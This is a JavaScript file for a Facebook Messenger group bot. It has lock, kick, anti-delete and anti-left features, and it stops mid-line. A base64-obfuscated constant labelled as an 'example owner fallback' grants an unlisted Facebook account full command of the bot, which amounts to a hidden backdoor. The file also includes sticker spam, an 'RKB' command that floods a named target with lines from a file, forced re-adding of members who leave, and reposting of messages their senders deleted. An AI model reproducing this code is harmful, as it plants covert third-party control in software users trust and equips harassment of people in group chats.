// botCore.js — Complete Bot: DP/Emoji/Nick locks, anti-delete, anti-left, toggles, all commands
const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca"); // Your login library

// ========== Persistent storage ==========
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},      // dp[threadID] = { path, savedAt }
  nick: {}     // nick[uid] = { [threadID]: nickname }
};
try {
  if (fs.existsSync(LOCK_FILE)) {
    locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
  }
} catch (e) {
  console.warn("Could not parse locks.json, using defaults:", e.message || e);
}
function saveLocks() {
  try { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); }
  catch (e) { console.error("Failed to save locks.json:", e.message || e); }
}

// ========== Helpers ==========
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close();
      return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file);
    file.on('finish', () => file.close(() => cb(null)));
  }).on('error', err => {
    try { fs.unlinkSync(dest); } catch {}
    cb(err);
  });
}
function safeJson(obj) { try { return JSON.stringify(obj, null, 2); } catch { return String(obj); } }
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8"); // Example owner fallback

// ========== Main Bot ==========
function startBot(appStatePath, ownerUID) {
  if (!appStatePath || !fs.existsSync(appStatePath)) {
    console.error("appstate not found:", appStatePath);
    return;
  }
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  // runtime state
  const messageCache = new Map(); // messageID -> { sender, body, attachments, threadID, timestamp }
  const nickCheckIntervals = {};  // uid -> intervalId
  let stickerInterval = null;
  let stickerLoopActive = false;
  let rkbInterval = null;
  let stopRequested = false;
  let targetUID = null;

  // toggles
  let antiDelete = true;
  let antiLeft = true;
  let antiDP = true; 

  // Login
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in, listening to events...");

    // ---------- Nick watcher ----------
    function startNickWatcher(uid, threadID) {  
      if (nickCheckIntervals[uid]) return;  
      nickCheckIntervals[uid] = setInterval(async () => {  
        try {  
          const info = await api.getThreadInfo(threadID);  
          const memberNick = (info.nicknames && info.nicknames[uid]) || (info.nick && info.nick[uid]) || null;  
          const savedNick = locks.nick?.[uid]?.[threadID] ?? null;  
          if (savedNick && memberNick !== savedNick) {  
            try {  
              await api.changeNickname(savedNick, threadID, uid);  
              console.log(`🔄 [nick] reverted ${uid} in ${threadID} -> ${savedNick}`);  
              await safeSend(api, `✏️ Locked nickname reverted for <@${uid}>`, threadID);  
            } catch (e) { console.error("nick revert failed:", e.message || e); }  
          }  
        } catch {}  
      }, 5000);  
    }  
    function stopNickWatcher(uid) {  
      if (nickCheckIntervals[uid]) {  
        clearInterval(nickCheckIntervals[uid]);  
        delete nickCheckIntervals[uid];  
      }  
    }  

    // ---------- Safe send ----------
    async function safeSend(apiInstance, text, tid) {  
      try { await apiInstance.sendMessage(text, tid); } catch (e) { console.error("sendMessage failed:", e.message || e); }  
    }  

    // ---------- Event listener ----------
    api.listenMqtt(async (err, event) => {  
      if (err || !event) return;

      // Anti-delete caching
      if (antiDelete && event.type === "message" && event.messageID) {  
        messageCache.set(event.messageID, {  
          sender: event.senderID,  
          body: event.body ?? "",  
          attachments: event.attachments ?? [],  
          threadID: event.threadID,  
          time: Date.now()  
        });  
        if (messageCache.size > 1000) {  
          Array.from(messageCache.keys()).slice(0, 200).forEach(k => messageCache.delete(k));  
        }  
      }  

      // Anti-delete
      if (antiDelete && event.type === "message_unsend") {  
        const deleted = messageCache.get(event.messageID);  
        const tid = event.threadID;  
        if (deleted) {  
          const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media/empty)"}\nTime: ${new Date(deleted.time).toLocaleString()}`;  
          await safeSend(api, text, tid);  
          if (deleted.attachments.length) {  
            try { await api.sendMessage({ body: "(attachment repost)", attachment: deleted.attachments }, tid); } catch {}  
          }  
        } else { await safeSend(api, "🚫 A message was deleted (no cache).", tid); }  
        return;  
      }  

      // Anti-left
      if (antiLeft && (event.logMessageType === "log:unsubscribe" || event.type === "log:unsubscribe")) {  
        const leftUID = event.logMessageData?.leftParticipantFbId;  
        const tid = event.threadID;  
        if (leftUID) {  
          try {  
            await api.addUserToGroup(leftUID, tid);  
            await safeSend(api, `👤 Anti-Left: Added back ${leftUID}`, tid);  
          } catch (e) {  
            console.error("anti-left add failed:", e.message || e);  
            await safeSend(api, `⚠️ Could not add back ${leftUID}`, tid);  
          }  
        }  
        return;  
      }  

      // DP revert
      if (antiDP && (event.type === "change_thread_image" || event.logMessageType === "log:thread-image")) {  
        const tid = event.threadID;  
        if (locks.dp[tid]?.path && fs.existsSync(locks.dp[tid].path)) {  
          try { await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid); } catch {}  
          await safeSend(api, "🖼️ Locked group DP reverted.", tid);  
        }  
        return;  
      }  

      // Emoji revert
      if (event.logMessageType === "log:thread-icon" || event.type === "change_thread_icon") {  
        const tid = event.threadID;  
        if (locks.emojis[tid]) {  
          try { await api.changeThreadEmoji(locks.emojis[tid], tid); } catch {}  
          await safeSend(api, `😀 Locked emoji reverted to ${locks.emojis[tid]}`, tid);  
        }  
        return;  
      }  

      // Commands
      if (event.type !== "message" || !event.body) return;
      const { threadID, senderID, body, mentions, messageReply } = event;
      const args = body.trim().split(" ").filter(Boolean);
      if (!args.length) return;
      const cmd = args[0].toLowerCase();
      const input = args.slice(1).join(" ").trim();

      if (![ownerUID, LID].includes(senderID)) return;

      const getTargetUID = () => {  
        const mentionKey = Object.keys(mentions || {})[0];  
        return mentionKey || messageReply?.senderID || ownerUID;  
      };  

      // ===== Commands Implementation =====
      if (cmd === "/help") {
        await safeSend(api, `
📖 Bot Commands:
/help → This message
/uid → User ID (mention/reply/owner fallback)
/tid → Thread ID
/info @mention → User info
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam
/stopsticker → Stop sticker spam
/rkb [name] → RKB spam
/stop → Stop all spam
/target [uid] → Set target UID
/cleartarget → Clear target
/antidp on|off → DP lock toggle
/antidelete on|off → Anti-Delete toggle
/antileft on|off → Anti-Left toggle
/exit → Bot exit
`, threadID);
        return;
      }

      if (cmd === "/tid") { await safeSend(api, `🆔 Thread ID: ${threadID}`, threadID); return; }
      if (cmd === "/uid") { const tgt = getTargetUID(); await safeSend(api, `🆔 UID: ${tgt}`, threadID); return; }
      if (cmd === "/info") { const tgt = getTargetUID(); try { const uinfo = await api.getUserInfo(tgt); const u = uinfo[tgt]||{}; await safeSend(api, `👤 Name: ${u.name||"unknown"}\nUID: ${tgt}\nProfile: https://facebook.com/${tgt}`, threadID); } catch { await safeSend(api, "⚠️ Could not fetch user info", threadID); } return; }

      // Kick
      if (cmd === "/kick") { const tgt = getTargetUID(); if (!tgt) { await safeSend(api, "❌ Mention user to kick", threadID); return; } try { await api.removeUserFromGroup(tgt, threadID); await safeSend(api, `👢 Kicked ${tgt}`, threadID); } catch { await safeSend(api, "⚠️ Kick failed", threadID); } return; }

      // Group name lock
      if (cmd === "/gclock") { if (!input) { await safeSend(api, "❌ Provide group name", threadID); return; } try { await api.setTitle(input, threadID); locks.groupNames[threadID] = input; saveLocks(); await safeSend(api, "🔒 Group name locked!", threadID); } catch { await safeSend(api, "⚠️ Failed to set group name", threadID); } return; }
      if (cmd === "/unlockgc") { delete locks.groupNames[threadID]; saveLocks(); await safeSend(api, "🔓 Group name unlocked!", threadID); return; }

      // Theme lock
      if (cmd === "/locktheme") { if (!input) { await safeSend(api, "❌ Provide color key", threadID); return; } try { await api.changeThreadColor(input, threadID); locks.themes[threadID] = input; saveLocks(); await safeSend(api, "🎨 Theme locked!", threadID); } catch { await safeSend(api, "⚠️ Theme lock failed", threadID); } return; }
      if (cmd === "/unlocktheme") { delete locks.themes[threadID]; saveLocks(); await safeSend(api, "🎨 Theme unlocked!", threadID); return; }

      // Emoji lock
      if (cmd === "/lockemoji") { if (!input) { await safeSend(api, "❌ Provide emoji", threadID); return; } locks.emojis[threadID]=input; saveLocks(); try{ await api.changeThreadEmoji(input, threadID);} catch{} await safeSend(api, `😀 Emoji locked → ${input}`, threadID); return; }
      if (cmd === "/unlockemoji") { delete locks.emojis[threadID]; saveLocks(); await safeSend(api, "😀 Emoji unlocked", threadID); return; }

      // DP lock
      if (cmd === "/lockdp") { try { const info = await api.getThreadInfo(threadID); const url = info.imageSrc||info.image||info.imageUrl; if(!url){ await safeSend(api,"❌ No DP to lock",threadID); return;} const dpPath=path.join(__dirname,`dp_${threadID}.jpg`); await new Promise((res,rej)=>downloadFile(url,dpPath,err=>err?rej(err):res())); locks.dp[threadID]={path:dpPath,savedAt:Date.now()}; saveLocks(); await safeSend(api,"🖼️ DP saved and locked",threadID); } catch { await safeSend(api,"⚠️ Failed to lock DP",threadID);} return;}
      if (cmd === "/unlockdp") { if(locks.dp[threadID]?.path){ try{fs.unlinkSync(locks.dp[threadID].path);}catch{} } delete locks.dp[threadID]; saveLocks(); await safeSend(api,"🖼️ DP unlocked",threadID); return; }

      // Nick lock
      if (cmd === "/locknick") { const mention = Object.keys(mentions||{})[0]; const nickname = input.replace(/<@[0-9]+>/,"").trim(); if(!mention||!nickname){await safeSend(api,"❌ Usage: /locknick @mention nickname",threadID);return;} locks.nick[mention]=locks.nick[mention]||{}; locks.nick[mention][threadID]=nickname; saveLocks(); startNickWatcher(mention,threadID); try{await api.changeNickname(nickname,threadID,mention);}catch{} await safeSend(api,`🔒 Nick locked for <@${mention}> → ${nickname}`,threadID); return; }
      if (cmd === "/unlocknick") { const mention=Object.keys(mentions||{})[0]; if(!mention){await safeSend(api,"❌ Usage: /unlocknick @mention",threadID);return;} if(locks.nick&&locks.nick[mention]){delete locks.nick[mention][threadID]; saveLocks();} stopNickWatcher(mention); await safeSend(api,`🔓 Nick unlocked for <@${mention}>`,threadID); return; }

      // Sticker spam
      if(cmd.startsWith("/sticker")){ const sec=parseInt(cmd.replace("/sticker",""))||2; if(!fs.existsSync("Sticker.txt")){await safeSend(api,"❌ Sticker.txt missing",threadID);return;} const stickers=fs.readFileSync("Sticker.txt","utf8").split("\n").map(s=>s.trim()).filter(Boolean); if(!stickers.length){await safeSend(api,"❌ No stickers in Sticker.txt",threadID); return;} let i=0; stickerLoopActive=true; if(stickerInterval) clearInterval(stickerInterval); stickerInterval=setInterval(()=>{ if(!stickerLoopActive){clearInterval(stickerInterval); stickerInterval=null; return;} api.sendMessage({sticker:stickers[i]},threadID).catch(()=>{}); i=(i+1)%stickers.length;},sec*1000); await safeSend(api,`⚡ Sticker spam started every ${sec}s`,threadID); return;}
      if(cmd==="/stopsticker"){ stickerLoopActive=false; if(stickerInterval){clearInterval(stickerInterval); stickerInterval=null;} await safeSend(api,"🛑 Sticker spam stopped",threadID); return;}

      // RKB spam
      if(cmd==="/rkb"){ const target=input.trim(); if(!target){await safeSend(api,"❌ Usage: /rkb [name]",threadID);return;} if(!fs.existsSync("np.txt")){await safeSend(api,"❌ np.txt missing",threadID);return;} const lines=fs.readFileSync("np.txt","utf8").split("\n").filter(Boolean); let idx=0; if(rkbInterval) clearInterval(rkbInterval); stopRequested=false; rkbInterval=setInterval(()=>{ if(stopRequested||idx>=lines.length){clearInterval(rkbInterval); rkbInterval=null; return;} api.sendMessage(`${target} ${lines[idx]}`,threadID).catch(()=>{}); idx++;},5000); await safeSend(api,`🤬 RKB started on ${target}`,threadID); return;}
      if(cmd==="/stop"){ stopRequested=true; if(rkbInterval){clearInterval(rkbInterval); rkbInterval=null;} if(stickerInterval){clearInterval(stickerInterval); stickerInterval=null; stickerLoopActive=false;} await safeSend(api,"🛑 Spam stopped",threadID); return;}

      // Target set/clear
      if(cmd==="/target"){ targetUID=input.trim()||null; await safeSend(api,`🎯 Target set: ${targetUID}`,threadID); return;}
      if(cmd==="/cleartarget"){ targetUID=null; await safeSend(api,"🎯 Target cleared!",threadID); return;}

      // Toggle commands
      if(cmd==="/antidp"){ if(input==="on"){antiDP=true; await safeSend(api,"🖼️ Anti-DP ON",threadID);} else if(input==="off"){antiDP=false; await safeSend(api,"🖼️ Anti-DP OFF",threadID);} else await safeSend(api,"Usage: /antidp on|off",threadID); return;}
      if(cmd==="/antidelete"){ if(input==="on"){antiDelete=true; await safeSend(api,"🚫 Anti-Delete ON",threadID);} else if(input==="off"){antiDelete=false; await safeSend(api,"🚫 Anti-Delete OFF",threadID);} else await safeSend(api,"Usage: /antidelete on|off",threadID); return;}
      if(cmd==="/antileft"){ if(input==="on"){antiLeft=true; await safeSend(api,"👤 Anti-Left ON",
